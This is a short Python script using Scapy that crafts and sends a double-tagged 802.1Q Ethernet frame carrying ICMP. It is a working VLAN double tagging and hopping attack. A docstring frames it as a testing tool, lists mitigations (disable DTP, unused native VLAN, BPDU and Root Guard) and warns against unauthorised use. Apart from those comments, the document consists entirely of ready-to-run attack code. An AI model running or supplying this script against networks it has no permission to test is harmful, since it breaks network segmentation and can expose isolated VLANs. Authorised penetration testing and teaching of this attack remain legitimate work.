#!/usr/bin/python3

from scapy.all import *
from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import Ether, Dot1Q

"""
This is a script for testing VLAN double tagging attacks, and VLAN hopping attacks.
Mitigation: To protect against VLAN double tagging and hopping attacks, disable DTP, configure ports as access ports, 
use an unused native VLAN, and implement BPDU Guard and Root Guard where appropriate.

Notes: only use for educational purposes. Do not use on networks you do not own or have permission to test.
"""
#Craft packet with 802.1Q headers
packet = Ether(dst="ff:ff:ff:ff:ff:ff")/\
         Dot1Q(vlan=1)/\
         Dot1Q(vlan=2)/\
         Dot1Q(vlan=2)/\
         IP(src="10.1.2.3",dst="10.1.2.254")/\
         ICMP()

#Show packet
packet.show()

#Sent packet
sendp(packet)